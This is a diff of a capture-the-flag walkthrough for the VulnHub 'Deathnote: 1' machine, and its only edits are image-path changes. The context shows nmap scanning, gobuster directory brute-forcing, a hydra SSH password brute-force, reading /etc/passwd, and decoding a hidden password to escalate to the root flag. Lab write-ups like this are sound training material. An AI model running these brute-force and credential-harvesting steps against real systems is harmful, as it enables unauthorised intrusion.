@@ -3,7 +3,7 @@
 - **Machine:** Deathnote: 1
 - **Download:** https://www.vulnhub.com/entry/deathnote-1,739/
 
-![](849-1.png)
+![](images/849-1.png)
 
 ---
 
@@ -23,7 +23,7 @@
 nmap -sn 192.168.2.0/24
 ```
 
-![](849-2.png)
+![](images/849-2.png)
 
 ---
 
@@ -35,7 +35,7 @@ Run a comprehensive Nmap scan to enumerate all open ports, services, operating s
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.238
 ```
 
-![](849-3.png)
+![](images/849-3.png)
 
 ---
 
@@ -59,7 +59,7 @@ This command performs an aggressive scan and uses the `http-enum` NSE script to 
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.238
 ```
 
-![](849-4.png)
+![](images/849-4.png)
 
 ---
 
@@ -73,7 +73,7 @@ Add the target hostname to the local hosts file.
 nano /etc/hosts
 ```
 
-![](849-5.png)
+![](images/849-5.png)
 
 ---
 
@@ -93,7 +93,7 @@ Visit:
 
 - http://deathnote.vuln/wordpress/
 
-![](849-6.png)
+![](images/849-6.png)
 
 ### Credentials Discovered
 
@@ -110,13 +110,13 @@ Login using the discovered credentials.
 
 - http://deathnote.vuln/wordpress/wp-login.php
 
-![](849-7.png)
+![](images/849-7.png)
 
 Successful login redirects to the WordPress dashboard.
 
 - http://deathnote.vuln/wordpress/wp-admin/
 
-![](849-8.png)
+![](images/849-8.png)
 
 ---
 
@@ -128,7 +128,7 @@ Perform directory brute-forcing against the WordPress installation.
 gobuster dir -u http://deathnote.vuln/wordpress/ -w /usr/share/wordlists/dirb/common.txt -x txt -t 50
 ```
 
-![](849-9.png)
+![](images/849-9.png)
 
 ---
 
@@ -140,7 +140,7 @@ Continue directory enumeration inside the `wp-content` directory.
 gobuster dir -u http://deathnote.vuln/wordpress/wp-content -w /usr/share/wordlists/dirb/common.txt -x txt -t 50
 ```
 
-![](849-10.png)
+![](images/849-10.png)
 
 ---
 
@@ -150,13 +150,13 @@ Visit:
 
 - http://deathnote.vuln/wordpress/wp-content/uploads/
 
-![](849-11.png)
+![](images/849-11.png)
 
 Navigate into the discovered folder.
 
 - http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/
 
-![](849-12.png)
+![](images/849-12.png)
 
 ---
 
@@ -170,7 +170,7 @@ wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
 wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt
 ```
 
-![](849-13.png)
+![](images/849-13.png)
 
 ---
 
@@ -186,7 +186,7 @@ Run Hydra using the downloaded username and password lists.
 hydra -L user.txt -P notes.txt deathnote.vuln ssh
 ```
 
-![](849-14.png)
+![](images/849-14.png)
 
 ### Valid Credentials
 
@@ -203,7 +203,7 @@ Password : death4me
 ssh l@deathnote.vuln
 ```
 
-![](849-15.png)
+![](images/849-15.png)
 
 ---
 
@@ -221,7 +221,7 @@ Display the user file.
 cat user.txt
 ```
 
-![](849-16.png)
+![](images/849-16.png)
 
 ---
 
@@ -231,7 +231,7 @@ Decode the contents using an online Brainfuck decoder.
 
 - https://www.dcode.fr/brainfuck-language
 
-![](849-17.png)
+![](images/849-17.png)
 
 ### Decoded Message
 
@@ -251,7 +251,7 @@ Review the system users.
 cat /etc/passwd
 ```
 
-![](849-18.png)
+![](images/849-18.png)
 
 ### Additional User Found
 
@@ -279,7 +279,7 @@ List the available files.
 ls -lh
 ```
 
-![](849-19.png)
+![](images/849-19.png)
 
 ---
 
@@ -295,7 +295,7 @@ cat case.wav
 cat hint
 ```
 
-![](849-20.png)
+![](images/849-20.png)
 
 ---
 
@@ -313,7 +313,7 @@ Convert the hexadecimal value.
 echo "6347467a6333646b49446f6761326c7959576c7a5a585a706243413d" | xxd -r -p
 ```
 
-![](849-21.png)
+![](images/849-21.png)
 
 Decode the resulting Base64 string.
 
@@ -321,7 +321,7 @@ Decode the resulting Base64 string.
 echo "cGFzc3dkIDoga2lyYWlzZXZpbCA=" | base64 -d
 ```
 
-![](849-22.png)
+![](images/849-22.png)
 
 ### Password Recovered
 
@@ -337,7 +337,7 @@ Password : kiraisevil
 su kira
 ```
 
-![](849-23.png)
+![](images/849-23.png)
 
 ---
 
@@ -361,7 +361,7 @@ List the files.
 ls -lh
 ```
 
-![](849-24.png)
+![](images/849-24.png)
 
 Read the root flag.
 
@@ -369,7 +369,7 @@ Read the root flag.
 cat root.txt
 ```
 
-![](849-25.png)
+![](images/849-25.png)
 
 ---
 
